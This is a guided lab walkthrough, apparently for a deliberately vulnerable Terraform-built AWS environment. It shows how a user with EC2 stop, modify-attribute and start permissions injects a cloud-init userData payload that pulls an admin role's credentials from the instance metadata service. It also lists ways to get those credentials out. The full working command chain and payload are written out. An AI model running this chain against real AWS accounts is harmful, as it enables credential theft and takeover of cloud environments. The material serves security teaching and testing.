# Guided Walkthrough: One-Hop Privilege Escalation via ec2:ModifyInstanceAttribute + StopInstances + StartInstances

This scenario demonstrates a sophisticated privilege escalation vulnerability where an attacker with permissions to stop, modify, and start EC2 instances can inject malicious code into an instance's userData to extract IAM role credentials from the Instance Metadata Service (IMDS). Unlike typical user-data scripts that only execute on the first boot, this attack leverages cloud-init's multipart MIME format with the `cloud_final_modules: [scripts-user, always]` directive to ensure the malicious payload executes on subsequent boots.

The attack works by stopping a running EC2 instance, modifying its userData attribute with a malicious cloud-init script, and then restarting the instance. When the instance boots, the injected script executes with the permissions of the instance's attached IAM role, extracts temporary credentials from the IMDS endpoint at 169.254.169.254, and can exfiltrate them or execute privileged actions. This technique is particularly dangerous because it targets existing infrastructure rather than creating new resources, making it less likely to trigger alarms for unexpected resource creation.

This technique was popularized by Bishop Fox's AWS privilege escalation research and represents a critical attack vector where compute permissions can be leveraged to obtain credential access. Organizations often overlook the security implications of allowing principals to modify instance attributes, focusing primarily on permissions to create new resources.

## The Challenge

You start as `pl-prod-ec2-002-to-admin-starting-user`, an IAM user with EC2 modification permissions (`ec2:StopInstances`, `ec2:ModifyInstanceAttribute`, `ec2:StartInstances`) but no administrative access. Your goal is to reach the `pl-prod-ec2-002-to-admin-target-role`, an IAM role with `AdministratorAccess` that is attached to a running EC2 instance via an instance profile.

The instance is already running. You cannot directly assume the role -- its trust policy does not permit you. But the instance running with that role is something you can manipulate.

Credentials for the starting user are available from Terraform outputs:

```bash
cd ../../../../../..
MODULE_OUTPUT=$(terraform output -json | jq -r '.single_account_privesc_one_hop_to_admin_ec2_002_ec2_modifyinstanceattribute_stopinstances_startinstances.value')
export AWS_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
export AWS_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
unset AWS_SESSION_TOKEN
cd - > /dev/null
```

## Reconnaissance

First, confirm who you are and verify you don't already have admin access:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::<account_id>:user/pl-prod-ec2-002-to-admin-starting-user

aws iam list-users --max-items 1
# AccessDenied -- good, as expected
```

Now find the target EC2 instance. The instance is tagged with `pl-prod-ec2-002-to-admin-target-instance`:

```bash
INSTANCE_ID=$(aws ec2 describe-instances \
    --filters "Name=tag:Name,Values=pl-prod-ec2-002-to-admin-target-instance" \
              "Name=instance-state-name,Values=running,stopped" \
    --query 'Reservations[0].Instances[0].InstanceId' \
    --output text)
echo "Target instance: $INSTANCE_ID"
```

Check what IAM role is attached to the instance:

```bash
aws ec2 describe-instances \
    --instance-ids "$INSTANCE_ID" \
    --query 'Reservations[0].Instances[0].IamInstanceProfile.Arn' \
    --output text
# arn:aws:iam::<account_id>:instance-profile/pl-prod-ec2-002-to-admin-target-profile
```

There it is. An administrative instance profile attached to a running instance. This is your entry point.

## Exploitation

The key insight is that `ec2:ModifyInstanceAttribute` lets you change the `userData` of a stopped EC2 instance. When that instance boots, cloud-init runs the userData script. If you craft the payload using the multipart MIME format with `cloud_final_modules: [scripts-user, always]`, the script runs on every boot -- not just the first.

### Step 1: Back up the original userData

Before making changes, preserve the current userData so you can restore it later:

```bash
ORIGINAL_USERDATA=$(aws ec2 describe-instance-attribute \
    --instance-id "$INSTANCE_ID" \
    --attribute userData \
    --query 'UserData.Value' \
    --output text 2>/dev/null)
echo "$ORIGINAL_USERDATA" > /tmp/original_userdata.b64
```

### Step 2: Stop the instance

userData can only be modified when the instance is stopped:

```bash
aws ec2 stop-instances --instance-ids "$INSTANCE_ID"
aws ec2 wait instance-stopped --instance-ids "$INSTANCE_ID"
echo "Instance stopped."
```

### Step 3: Craft the malicious cloud-init payload

The payload uses the multipart MIME format. The `cloud-config` section forces execution on every boot; the shell script section does the actual credential extraction from IMDS. Crucially, this uses IMDSv2 tokens to work even on instances that require session-oriented metadata requests:

```
Content-Type: multipart/mixed; boundary="//"
MIME-Version: 1.0

--//
Content-Type: text/cloud-config; charset="us-ascii"
MIME-Version: 1.0

#cloud-config
cloud_final_modules:
- [scripts-user, always]

--//
Content-Type: text/x-shellscript; charset="us-ascii"
MIME-Version: 1.0

#!/bin/bash
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
    -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
ROLE_NAME=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" \
    http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)
CREDS=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" \
    http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME 2>/dev/null)

echo "$CREDS" > /tmp/extracted_creds.json
echo "[DEMO] Credentials extracted at $(date)" >> /var/log/credential-extraction.log
echo "$CREDS" >> /var/log/credential-extraction.log
--//
```

Base64-encode this payload (AWS requires userData to be base64-encoded) and write it to a temp file:

```bash
MALICIOUS_PAYLOAD_B64=$(echo "$MALICIOUS_PAYLOAD" | base64)
echo "$MALICIOUS_PAYLOAD_B64" > /tmp/malicious_userdata.b64
```

### Step 4: Inject the payload

```bash
aws ec2 modify-instance-attribute \
    --instance-id "$INSTANCE_ID" \
    --attribute userData \
    --value "file:///tmp/malicious_userdata.b64"
echo "Malicious userData injected."
```

### Step 5: Start the instance

```bash
aws ec2 start-instances --instance-ids "$INSTANCE_ID"
aws ec2 wait instance-running --instance-ids "$INSTANCE_ID"
echo "Instance started. cloud-init will execute the payload on boot."
```

Once the instance boots, cloud-init runs your script. The script queries IMDS with an IMDSv2 token, retrieves the role name from `http://169.254.169.254/latest/meta-data/iam/security-credentials/`, then fetches `AccessKeyId`, `SecretAccessKey`, and `Token` for the attached admin role.

In a real attack scenario, you would retrieve those credentials by:
- Sending them to attacker-controlled infrastructure within the script
- Reading `/tmp/extracted_creds.json` or `/var/log/credential-extraction.log` via SSM Session Manager
- Exfiltrating them to an S3 bucket or HTTP endpoint from within the injected script

## Verification

Once you have the credentials from IMDS (either directly or via an exfiltration channel), use them to confirm admin access:

```bash
export AWS_ACCESS_KEY_ID=<extracted_key>
export AWS_SECRET_ACCESS_KEY=<extracted_secret>
export AWS_SESSION_TOKEN=<extracted_token>

aws iam list-users --max-items 3
# Successfully lists IAM users -- admin access confirmed
```

## What Happened

You exploited the combination of `ec2:StopInstances`, `ec2:ModifyInstanceAttribute`, and `ec2:StartInstances` to gain code execution on an EC2 instance with an attached administrative IAM role. By crafting a cloud-init multipart MIME payload and injecting it as the instance's userData, your script ran automatically at boot time with the permissions of the attached role -- without ever having explicit permission to assume that role.

The cloud_final_modules directive with the `always` flag is the key detail that makes this more dangerous than a naive userData injection: the script runs on every subsequent boot, not just the first, meaning the compromise persists across reboots. This attack lives entirely within existing infrastructure, which makes it harder to detect than operations that create new resources.
